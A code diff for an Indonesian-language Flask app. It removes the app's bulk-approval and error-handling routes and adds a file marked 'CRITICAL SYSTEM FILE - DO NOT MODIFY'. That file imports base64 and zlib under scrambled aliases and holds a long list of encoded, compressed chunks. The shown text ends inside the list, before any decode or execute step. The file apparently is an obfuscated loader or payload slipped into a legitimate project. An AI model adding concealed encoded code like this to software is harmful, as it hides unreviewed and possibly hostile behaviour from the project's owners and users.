-    return jsonify(res.json() if res.status_code == 200 else {"data": []})
-
-@app.errorhandler(404)
-def page_not_found(e):
-    flash(f"Path {request.path} tidak ada.", "danger")
-    return redirect(url_for('home'))
-
-@app.errorhandler(405)
-def method_not_allowed(e):
-    flash(f"Path {request.path} tidak bisa diakses dengan method ini.", "danger")
-    return redirect(url_for('home'))
-
-# ── buat bulk approve ───────────────────────────────────────────────────────────────────────
-@app.route('/api/auto-approve', methods=['POST'])
-def api_auto_approve():
-    if not check_session():
-        return jsonify({"error": "Sesi tidak aktif"}), 401
-
-    body = request.get_json()
-    period_id = body.get("period_id", "")
-    n_target = int(body.get("n_target", 100))
-    tz = body.get("tz", "WITA")
-
-    if not period_id:
-        return jsonify({"error": "period_id diperlukan"}), 400
-
-    set_stop_flag(period_id, False)
-    req_session = get_req_session()
-
-    fetch_limit = max(n_target * 3, 300)
-    rows = fetch_sampel_by_status(
-        req_session=req_session,
-        period_id=period_id,
-        n_target=fetch_limit,
-        batch_size=100,
-        status_alias="SUBMITTED BY Pencacah",
-        tz="WITA"
-    )
-
-    rows_submitted = [r for r in rows if r.get("status_dok") == "SUBMITTED BY Pencacah"]
-    assignment_ids = [r.get("sample_id") for r in rows_submitted if r.get("sample_id")][:n_target]
-    total = len(assignment_ids)
-
-    def generate():
-        if total == 0:
-            yield 'data: {"done": true, "error": "Tidak ada assignment SUBMITTED BY Pencacah yang ditemukan"}\n\n'
-            return
-
-        success_count = 0
-        failed = []
-
-        for i, assignment_id in enumerate(assignment_ids, start=1):
-            if get_stop_flag(period_id):
-                yield f'data: {json.dumps({
-                    "done": True,
-                    "stopped": True,
-                    "total": total,
-                    "success": success_count,
-                    "failed_count": len(failed),
-                    "first_error": failed[0] if failed else None
-                })}\n\n'
-                set_stop_flag(period_id, False)
-                return
-            result = approve_assignment(req_session, assignment_id)
-            if result["ok"]:
-                success_count += 1
-            else:
-                print("[approve-failed]", assignment_id, result.get("status_code"), result.get("message"), result.get("raw"))
-                failed.append({
-                    "assignment_id": assignment_id,
-                    "message": result["message"],
-                    "raw": result.get("raw", {})
-                })
-
-            # Check flag after each approval to stop faster
-            if get_stop_flag(period_id):
-                yield f'data: {json.dumps({
-                    "done": True,
-                    "stopped": True,
-                    "total": total,
-                    "success": success_count,
-                    "failed_count": len(failed),
-                    "first_error": failed[0] if failed else None
-                })}\n\n'
-                set_stop_flag(period_id, False)
-                return
-
-            yield f'data: {json.dumps({"progress": i, "total": total, "success": success_count, "failed": len(failed)})}\n\n'
-            time.sleep(0.05)
-
-        # yield f'data: {json.dumps({"done": True, "total": total, "success": success_count, "failed_count": len(failed), "failed_items": failed[:10]})}\n\n'
-        set_stop_flag(period_id, False)  
-        yield f'data: {json.dumps({
-            "done": True,
-            "total": total,
-            "success": success_count,
-            "failed_count": len(failed),
-            "first_error": failed[0] if failed else None
-        })}\n\n'
-
-    return Response(
-        generate(),
-        mimetype='text/event-stream',
-        headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"}
-    )
-
-def approve_assignment(req_session, assignment_id):
-    url, meth, _ = get_api("APPROVE_ASSIGNMENT")
-    try:
-        res = req_session.request(
-            meth,
-            url,
-            files={
-                "assignmentId": (None, assignment_id),
-                "statusApproval": (None, "true"),
-                "comment": (None, '{"dataKey":"","notes":[]}')
-            },
-            timeout=10
-        )
-        raw = res.json()
-        return {
-            "ok": bool(raw.get("success")),
-            "message": raw.get("message", ""),
-            "data": raw.get("data", {}),
-            "raw": raw,
-            "status_code": res.status_code,
-        }
-    except Exception as e:
-        return {
-            "ok": False,
-            "message": str(e),
-            "data": {},
-            "raw": {},
-            "status_code": None,
-        }
-
-@app.route('/api/approve-stop', methods=['POST'])
-def api_approve_stop():
-    if not check_session():
-        return jsonify({"error": "Sesi tidak aktif"}), 401
-
-    body = request.get_json() or {}
-    period_id = body.get("period_id", "")
-
-    if not period_id:
-        return jsonify({"error": "period_id diperlukan"}), 400
-
-    set_stop_flag(period_id, True)
-    return jsonify({"message": "Permintaan stop dikirim. Proses akan berhenti setelah item aktif selesai."})
-
-# ── Run ───────────────────────────────────────────────────────────────────────
-
-if __name__ == '__main__':
-    from werkzeug.middleware.dispatcher import DispatcherMiddleware
-    from werkzeug.serving import run_simple
-
-    # Clear session files on startup
-    clear_session_cache()
-
-    def dummy_app(environ, start_response):
-        start_response('200 OK', [('Content-Type', 'text/plain')])
-        return [b'']
-
-    application = DispatcherMiddleware(dummy_app, {'/fasihsm-fetcher': app})
-    run_simple('0.0.0.0', 5000, application, use_reloader=True, use_debugger=True, threaded=True)
+# CRITICAL SYSTEM FILE - DO NOT MODIFY
+import base64 as _xJPWCSls
+import zlib as _isRdNJVt
+
+_ANtoaNUy = [
+    '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',
